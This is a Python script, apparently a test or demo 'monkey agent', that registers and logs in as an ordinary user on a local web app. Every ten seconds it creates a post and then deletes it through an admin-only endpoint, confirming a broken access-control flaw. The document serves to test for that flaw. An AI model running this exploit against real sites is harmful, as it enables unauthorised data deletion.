# monkey_agent.py

import requests
import time

# --- Agent Configuration ---
BASE_URL = "http://localhost:5000"
ATTACK_INTERVAL_SECONDS = 10 # How often the monkey attacks

# We'll use a session object to hold our login cookies
session = requests.Session()

def register_user(username, password):
    """Registers a new 'USER' role user."""
    print(f"Monkey: Registering user '{username}'...")
    try:
        r = session.get(
            f"{BASE_URL}/register",
            params={'username': username, 'password': password}
        )
        if r.status_code == 200:
            print(f"Monkey: User '{username}' registered.")
        else:
            print(f"Monkey: User '{username}' may already exist.")
    except requests.exceptions.ConnectionError:
        print("Monkey: Error - Cannot connect to victim app. Is it running?")
        return False
    return True

def login_user(username, password):
    """Logs in as the specified user."""
    print(f"Monkey: Logging in as '{username}'...")
    r = session.get(
        f"{BASE_URL}/login",
        params={'username': username, 'password': password}
    )
    if r.status_code != 200:
        print("Monkey: Login failed!")
        return False
    print(f"Monkey: Login successful. (Session cookies stored)")
    return True

def create_post(title, content):
    """Creates a new post as the logged-in user."""
    print(f"Monkey: Creating a new post: '{title}'...")
    r = session.get(
        f"{BASE_URL}/create_post",
        params={'title': title, 'content': content}
    )
    if r.status_code != 200:
        print("Monkey: Post creation failed!")
        return False
    print("Monkey: Post created successfully.")
    return True

def exploit_vulnerability(post_id_to_delete):
    """
    !!! THE ATTACK !!!
    This function exploits the logic flaw, using the 'USER' session
    to call an 'ADMIN' endpoint.
    """
    print("---------------------------------------------------------")
    print(f"Monkey: *** ATTACKING ***")
    print(f"Monkey: Attempting to delete post {post_id_to_delete} AS A NORMAL USER...")
    
    r = session.get(f"{BASE_URL}/admin/delete/{post_id_to_delete}")
    
    if r.status_code == 200:
        print(f"Monkey: *** VULNERABILITY CONFIRMED ***")
        print(f"Monkey: Server responded with: '{r.text}'")
    else:
        print(f"Monkey: Attack failed. (Maybe the bug is fixed?)")
    print("---------------------------------------------------------")

def run_attack_loop():
    """Main loop for the monkey agent."""
    
    # Set up our users one time
    if not register_user("monkey_user", "monkeypass"):
        # Exit if app isn't running
        return
        
    # We only need to log in once
    if not login_user("monkey_user", "monkeypass"):
        return
    
    post_counter = 1
    while True:
        print(f"\n--- Monkey Cycle {post_counter} ---")
        
        # 1. Create a post (so we have something to delete)
        create_post(f"Post {post_counter}", "This post was made by the monkey.")
        
        # 2. Run the exploit
        exploit_vulnerability(post_id_to_delete=post_counter)
        
        post_counter += 1
        
        print(f"Monkey: Sleeping for {ATTACK_INTERVAL_SECONDS} seconds...")
        time.sleep(ATTACK_INTERVAL_SECONDS)

if __name__ == "__main__":
    print("Starting Monkey Agent (v1)...")
    run_attack_loop()